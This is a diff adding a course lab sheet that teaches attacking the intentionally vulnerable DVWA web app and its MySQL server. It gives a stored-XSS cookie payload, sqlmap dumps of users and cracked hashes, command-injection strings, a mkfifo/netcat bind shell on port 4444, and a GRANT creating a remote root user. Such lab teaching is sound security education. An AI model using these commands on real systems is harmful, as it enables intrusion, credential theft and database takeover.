@@ -1,0 +1,288 @@
+* LAB: HACKING MYSQL and WEB-APP (dvwa)
+
+You will:
+- [X] HACKING into DB-server and
+  - [X] Create a new WEB-APP user (<your_name>/comein) for WEB-APP login (login.php)
+  - [X] Create a new DB-user 'root'@'%' (remote DB-login)
+
+
+* Overview: Hacking Mysql and a WEB-APP with user-login
+
+Step 1: INFORMATION gathering
+- [ ] get DB-information (what database, tables, user, passwords, ...)
+  - [ ] use XSS (stored) to get session-id
+  - [ ] use sqlmap to get login passwords
+
+Step 2: HACK into DB and create WEB-APP user for WEB-APP login
+- [ ] use Command Injection to find/read file config.inc.php
+  - [ ] config.inc.php holds password for user: admin (DVWA) 
+- [ ] use mysql> to create a new user in database dvwa
+- [ ] mysql> use database dvwa and insert a new user (<your name>/comein)
+- [ ] login: http://localhost/dvwa/login.php
+
+Step 3: HACK into remote Computer (shell-access) and create DB-user 'root'@'%' (remote DB-login)
+- [ ] use Command Injection to get shell-access
+- [ ] use mysql> to get root-access and create user root@%
+- [ ] test remote login and full root access to the database.
+
+
+* DIY 1: INFORMATION gathering (what database, tables, users, passwords are used in WEB-APP)
+
+** Step 1: use XSS (stored) to get session-id
+
+#+BEGIN_SRC php
+<script>alert(document.cookie );</script>
+
+for example: lpmkv3jih7chc14mf9186bdni5
+#+END_SRC
+
+
+** Step 2: use sqlmap to get passwords for WEB-APP login-users
+
+1. [ ] goto folder scripts/sqlmap and edit Makefile:
+   - URLBASE= http://localhost or http://172.16.48.122:88## (## is your indiv. number)
+   - PHPSESSID=lpmkv3jih7chc14mf9186bdni5
+   - SQLMAP=sqlmap
+
+2. [ ] use make and get DB infos and store the results in file NAME-dvwa-db-info-by-sqlmap.txt
+
+#+BEGIN_SRC bash
+make
+make 1
+make 2
+make 2 > NAME-dvwa-db-info-by-sqlmap.txt
+make 3
+make 3 >> NAME-dvwa-db-info-by-sqlmap.txt
+...
+make 6
+make 6 >> NAME-dvwa-db-info-by-sqlmap.txt
+press some enter
+
+
+
+See some infos (cat NAME-dvwa-db-info-by-sqlmap.txt):
+...
+available databases [4]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+
+...
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+...
+Database: dvwa
+Table: users
+[8 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| user         | varchar(15) |
+| avatar       | varchar(70) |
+| failed_login | int(3)      |
+| first_name   | varchar(15) |
+| last_login   | timestamp   |
+| last_name    | varchar(15) |
+| password     | varchar(32) |
+| user_id      | int(6)      |
++--------------+-------------+
+
+...
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+
+
+#+END_SRC
+
+
+** Step 3: test WEB-APP login-user: smithy/password with: http://localhost/login.php
+
+
+** Step 4: use sqlmap to get all DB-users of the DB-server
+
+- [ ] hint: use sqlmap to find (User, Password ,Host) from
+  - [ ] Database: mysql,
+  - [ ] Table: user
+
+- [ ] answer: use this sqlmap-command (adjust some values)
+
+#+BEGIN_SRC bash
+
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=lpmkv3jih7chc14mf9186bdni5" -D mysql -T user -C User,Password,Host --dump
+
+your output could be:
+
+Database: mysql
+Table: user
+[5 entries]
++--------+-------------------------------------------+--------------+
+| User   | Password                                  | Host         |
++--------+-------------------------------------------+--------------+
+| root   | <blank>                                   | localhost    |
+| root   | <blank>                                   | 6db72f2016ca |
+| root   | <blank>                                   | 127.0.0.1    |
+| root   | <blank>                                   | ::1          |
+| admin  | *C4875E03A0686D7AE50A6C2CB132E38FCC9EABCE | %            |
++--------+-------------------------------------------+--------------+
+
+#+END_SRC
+
+
+** Step 5: RESULT: *Only* user *admin* has *remote access* to the mysql-database.
+
+
+* DIY 2: What is the password of DB-user admin?
+
+In file *config.inc.php* is a DB-user (incl. password) named admin that
+1. has access and all privs for database dvwa
+2. has privs to create a new DB-user
+
+** Step 1: use command Injection to find config.inc.php
+- hint: how to find **config.inc.php**
+
+- [ ] use WEB-APP/DVWA: Command execution and enter
+
+#+BEGIN_SRC bash
+127.0.0.1; find / -name config.inc.php
+
+
+the output is:
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.068 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.078 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.067 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3060ms
+rtt min/avg/max/mdev = 0.027/0.060/0.078/0.019 ms
+/app/config/config.inc.php
+
+#+END_SRC
+
+
+** Step 2: use command `cat /app/config/config.inc.php` to get the password for user admin
+
+- hint: use *view-source* in your browser
+- Answer: the password of user admin is ZdV6GJ5t6FIq
+
+
+** Step 3: get remote access to the mysql-server and use the dvwa database
+
+- Exercise: remote login to mysql on DVWA-Server
+
+#+BEGIN_SRC sql
+
+mysql -u admin -h localhost or 172.16.48.122 -P 3066 -p
+   <enter the passwd> you will find it in config.inc.php on DVWA-Server ...
+
+use dvwa;
+#+END_SRC
+
+
+
+
+
+
+** Step 4: insert a new WEB-APP-user (<your_name>/comein) for login using login.php
+
+- [ ] login to the mysql-database with the user admin and
+- [ ] create a record into table dvwa.users
+
+#+BEGIN_SRC sql
+hint: (use your name below)
+
+use dvwa;
+
+describe users;
+
+insert into dvwa.users (user_id, first_name, last_name, user, password)
+values(99, 'anton', 'hofmann', 'hofmann', 'comein');
+
+update users  set password=md5('comein') where user_id=99;
+#+END_SRC
+
+
+** Step 5: test your new WEB-APP-user using http://localhost/login.php
+
+
+
+
+* DIY 3: Get remote shell-access to use DB-user root@localhost
+
+1. With command injection we will start a shell-service on port 4444 of the DVWA-Server.
+2. with a simple local netcat command we can connet to the remote DVWA-Server.
+
+** Step 1: Command Injection to get remote shell-access
+
+1. On DVWA-Server: Command injection:
+
+#+BEGIN_SRC bash
+127.0.0.1 ; mkfifo /tmp/pipe ; sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+#+END_SRC
+
+- Make a FIFO named pipe.
+  - Pipes allow separate processes to communicate (without having been designed explicitly to work together.)
+  - This will allow two processes to connect to netcat.
+- Use (nc -l 4444) to tell netcat to listen and allow connections on port 4444.
+
+- Use (mkfifo /tmp/pipe) to create a named pipe that provides IPC (Inter Process Communication)
+- Use (sh /tmp/pipe) to attach an interactive shell to the named pipe (/tmp/pipe).
+- Use (sh /tmp/pipe | nc -l 4444) to attach the interactive shell to the netcat session listening on port 4444.
+- Use (nc -l 4444 > /tmp/pipe) to receive the output of netcat session and send it to the named pipe's input, 
+where it becomes input for the shell.
+- Click Submit
+
+
+2. on your other Computer
+- Use nc to Connect to DVWA Netcat session on port 4444
+
+#+BEGIN_SRC bash
+$> nc 172.16.48.122 4444
+
+$> hostname
+This is server hostname that hosts DVWA.
+
+$> uname -a
+List System Kernel and Architecture Information
+
+$> who
+Display who is logged in
+
+$> cat /etc/passwd
+Show  /etc/passwd file
+
+#+END_SRC
+
+
+
+
+** Step 2: use mysql> to create DB-user root@% to HACK and TAKE OVER DB
+
+#+BEGIN_SRC bash
+echo "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'comein' WITH GRANT OPTION;" | mysql -u root
+#+END_SRC
+
+
+That's it. We have REMOTE ROOT ACCESS to the DB-server of DVWA!!!
+
+
+
+* Add-on: get db-access using sql-injection
+- see [[http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/]]
